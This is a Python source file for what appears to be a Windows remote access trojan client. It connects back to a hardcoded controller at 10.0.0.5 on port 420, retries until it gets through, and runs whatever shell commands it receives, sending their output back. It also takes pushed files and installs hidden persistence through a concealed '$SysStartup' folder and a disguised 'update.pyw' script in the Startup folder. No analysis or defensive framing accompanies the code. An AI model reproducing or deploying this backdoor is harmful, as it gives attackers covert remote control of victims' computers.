import socket as s
from subprocess import check_output, call
from time import sleep
from sys import exit
from random import randint
from os import getlogin
import threading

HOST = "10.0.0.5"
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

var = """
import threading
from subprocess import call

def a0001(): call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
a0001 = threading.Thread(target=a0001)
a0001.start()

"""


def connector():
    try:
        global client
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect(ADDR)
        recvMsg()
    except (ConnectionRefusedError, TimeoutError):
        print("retrying in 30 secs")
        sleep(30)
        connector()


def sendMsg(msg):
    sendLength = str(len(msg)).encode(FORMAT)
    client.send(sendLength)

    client.send(msg.encode(FORMAT))
    recvMsg()


def process(message):
    ctype = message[0]
    if ctype == "c":
        messageLst = message.split(" ")
        mode = messageLst[1]
        messageLst.pop(0)
        messageLst.pop(0)

        def comm():
            return check_output(messageLst, shell=True).decode(FORMAT)

        def tComm():
            call(messageLst, shell=True)

        if mode == "o":
            sendMsg(comm())
        else:
            threads = threading.Thread(target=tComm)
            threads.start()
            recvMsg()

    elif ctype == "f":
        msgNoType = message[1:]
        mode = msgNoType[4]
        msg = message[5:]
        fType = msgNoType[0:3].replace(' ', '')
        name = f"a{randint(100, 900)}.{fType}"

        with open(f"{name}", "w") as fileObj:
            fileObj.write(msg)

        if mode == "A":
            if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
                call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
                    if fType == "py" or "pyw":
                        obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
                        obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
                        obj.write(f'b{name[0:4]}.start()')

                sendMsg(name)
            else:
                call(["remove", name])
                sendMsg("err")
        else:
            call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
            sendMsg(name)
    elif ctype == "x":
        call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
        message = message[1:]
        with open("pslib.pyw", "a") as file:
            file.write(message)
        call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
        with open("update.pyw", "w") as file:
            file.write(var)
        call('move test.txt "C:/Users/failo/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)
        recvMsg()

    else:
        if message == "!dsc":
            client.close()
            exit()


def recvMsg():
    try:
        msgLen = client.recv(BUFFER).decode(FORMAT)

        if msgLen and not "":
            msgLen = int(msgLen)
            msg = client.recv(int(msgLen)).decode(FORMAT)
            process(msg)
    except (TimeoutError, ConnectionResetError):
        sleep(30)
        connector()


connector()
